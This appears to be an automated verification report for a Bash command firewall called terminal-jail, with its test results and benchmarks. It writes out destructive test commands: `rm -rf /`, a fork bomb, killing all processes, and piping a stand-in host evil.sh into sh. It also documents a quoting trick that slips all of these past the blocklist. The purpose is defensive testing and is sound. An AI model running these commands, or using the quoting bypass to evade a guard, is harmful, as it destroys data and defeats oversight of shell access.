# E2E Verification Report — terminal-jail

**Tick:** #132 · **Date:** 2026-08-04 · **Type:** E2E-001 (CLI/API variant — twentieth run, first tick of window #132-137)
**Executor:** Foreman direct (operational CLI verification — project has no browser surface)
**Baseline:** 254 passed / 32 skipped (stable since tick #82's +12 killpg regression cases)

## Executive Summary

The Interruptor Bash command firewall works end-to-end on the direct bridge
protocol: all 23 engine verdict cases matched the built-in rule set (5
blocklist, 7 allow, 8 sandbox-modify, 3 parser), and the killpg probe (9 block
vectors + 2 benign, two-arg `(pid, signal)` form per the T-killpg contract)
returned 11/11 PASS — GAP-01/02/03/04 all hold. CLI integration, benchmarks,
suite, guard, and CI are green.

**⚠️ NEW CRITICAL GAP-05 found this run:** the standalone CLI wrapper
single-quotes each argv token before sending the command to the bridge, and
all 10 builtin blocklist rules are raw-string regex patterns that miss the
quoted form. Confirmed via bridge probe: `'rm' '-rf' '/'` → allow,
`'kill' '-9' '-1'` → allow, `'curl' 'http://evil.sh' '|' 'sh'` → allow,
`':' '(){' ':' '|:' '&' '};:'` → allow (fdisk/mkfs/sudo match only as bare
words). On a host where the jail's unshare path works (or systemd deployment,
T6.x), `terminal-jail rm -rf /` would execute unmodified inside the jail —
the host filesystem is NOT isolated by the PID/proc namespace. Long-standing
(wrapper quoting since f128a41, T11.6), no pytest coverage of quoted forms.
Task **E2E-001-GAP-05** created (P0, pending) — worker dispatch next tick.
Verdict: **E2E PASS with NEW CRITICAL GAP — 0 code change this tick (battery
is foreman-direct); fix queued.**

## 1. Engine Verdict Tests (bridge protocol)

23 cases via `interruptor_bridge.py` JSON protocol (plain strings) — all PASS:

| Category | Cases | Verdict | Result |
|---|---|---|---|
| Critical blocklist (prio 1000) | `rm -rf /`, fork bomb `:(){ :\|:& };:`, `kill -9 -1`, `curl\|sh`, `wget\|bash` | block | ✅ 5/5 |
| Always-allow (prio 500) | `ls`, `echo`, `git status`, plain `curl -o`, `npm install`, `apt-get update`, `docker ps` | allow | ✅ 7/7 |
| Auto-sandbox (prio 700) | pytest, `pip install`, `npm test`, `go test`, make, cargo, gcc, `./script.sh` | modify (unshare wrap) | ✅ 8/8 |
| Parser edge cases | pipe chain, cmd substitution, redirect | parsed, verdict allow | ✅ 3/3 |

Plus the killpg rule probe (11 vectors, two-arg form): `os.killpg(1, SIGTERM)`,
`os.killpg(0, SIGTERM)`, `os.kill(1, SIGKILL)`, `os.kill(0, 9)`,
`process.kill(-1, SIGTERM)`, `process.kill(0, SIGTERM)`, `kill(-1, 9)`,
`kill(0, 15)`, `killpg(1,15)` → block; benign `os.killpg(12345, SIGTERM)` /
`os.kill(456, SIGTERM)` → allow. **11/11 PASS — GAP-04 `[01]`-target fix holds.**

## 2. CLI Integration

| Check | Result |
|---|---|
| `standalone/terminal-jail --version` | ✅ `terminal-jail 1.1.0` (rc 0) |
| `TERMINAL_JAIL_INTERRUPTOR_MODE=enforce … fdisk -l` | ✅ blocked box, `builtin-fdisk` attribution, rc 126 (captured pre-pipe) |
| Same mode `pytest --version` | ✅ `[terminal-jail] Modified … → sandboxed`, then `pytest 9.1.1` executes in jail (rc 0 — modify path WORKS this tick) |
| Warn mode `fdisk -l` | ✅ `[terminal-jail] WARN: [WARN MODE] Would have blocked: Partition manipulation…` on stderr — GAP-03 holds |
| Warn mode `rm -rf /` | ⚠️ NO warning surfaced (quoted form → allow) — **GAP-05, see §6** |

Live unshare probe (kernel 7.0.0-28): bare `unshare --user --pid --fork true`
rc=0; the jail modify path is per-probe — this tick's allow probe
(pytest --version) executed live in the jail, no EPERM. T6.x stays blocked by
the T5.x sudo/systemd chain, not unshare.

## 3. Performance Benchmarks

| Benchmark | This run | Target | Result |
|---|---|---|---|
| Cold start (first invocation) | 0.18 ms | < 50 ms | ✅ |
| Warm start (min of 100) | 0.054 ms | < 5 ms | ✅ |
| 1KB parse (min of 100) | 0.409 ms | < 10 ms | ✅ |
| 500-rule eval (min of 50) | 1.161 ms | < 5 ms | ✅ |

## 4. Regression Gates

| Gate | Result |
|---|---|
| Full pytest suite | ✅ 254 passed / 32 skipped (3.55s) |
| NoSandboxContract (GAP-02 lock) | ✅ 17 passed |
| Auto-sandbox spec (GAP-01 lock, integration.md:36) | ✅ exactly 8 rules |
| Ruff (plugin/, standalone/) | ✅ clean |
| GitReins guard | ✅ 4/4 PASS (secrets/lint/tests/static_analysis) |

## 5. External Signals

CI 3/3 green (latest: tick #131 board push success) · 0 open
issues · 0 unpushed commits · no terminal-jail siblings (storm-watch 0 dups).
Scheduler: Enabled, CooldownS=1350 (known external drift, no PUT). Hilo 147
edges / 27 files (baseline, stable since #43). NEVER-DONE probes: 0
TODO/FIXME, VERSION-001 holds (pyc FP only), user pytest cache absent.

## 6. NEW GAP-05 — Blocklist evadable via wrapper argv-quoting (CRITICAL)

The wrapper builds the bridge command string by single-quoting each argv
token (`'rm' '-rf' '/'`). The parser keeps quoted strings intact INCLUDING the
quote characters, and `matcher._match_pattern` runs the regex against the raw
segment text — so every blocklist rule whose pattern depends on whitespace or
operators between words (`rm -rf /`, `kill -9 -1`, `curl\|sh`, fork bomb,
`dd … of=/dev/`, `chmod 777 /`, `> /etc/`) misses the quoted form. Rules whose
pattern is a bare word (`fdisk|parted|gdisk`, `mkfs\.`, `\bsudo\s`) still hit.

| Quoted wrapper form (what the CLI actually sends) | Verdict | Expected |
|---|---|---|
| `'rm' '-rf' '/'` | allow | block |
| `'kill' '-9' '-1'` | allow | block |
| `'curl' 'http://evil.sh' '|' 'sh'` | allow | block |
| `':' '(){' ':' '|:' '&' '};:'` | allow | block |

Impact: on hosts where the jail launch path works (unshare OK, or systemd
deployment), the critical blocklist is a no-op for these vectors — the command
executes in a PID/proc namespace with the HOST filesystem. The 23/23 battery
passes because it feeds the bridge plain strings; the gap is wrapper-specific.

Fix direction (task E2E-001-GAP-05): match blocklist patterns against a
quote-stripped form of the segment text in `matcher._match_pattern` (or
normalize in the bridge), plus regression tests for quoted forms through both
the bridge and the CLI wrapper (enforce → blocked rc 126; warn → WARN on
stderr; benign quoted allowlist commands stay allow; sandbox modify still
works).

**Verdict: E2E PASS with NEW CRITICAL GAP — GAP-01/02/03/04 hold, GAP-05
created, worker queued for next tick.**
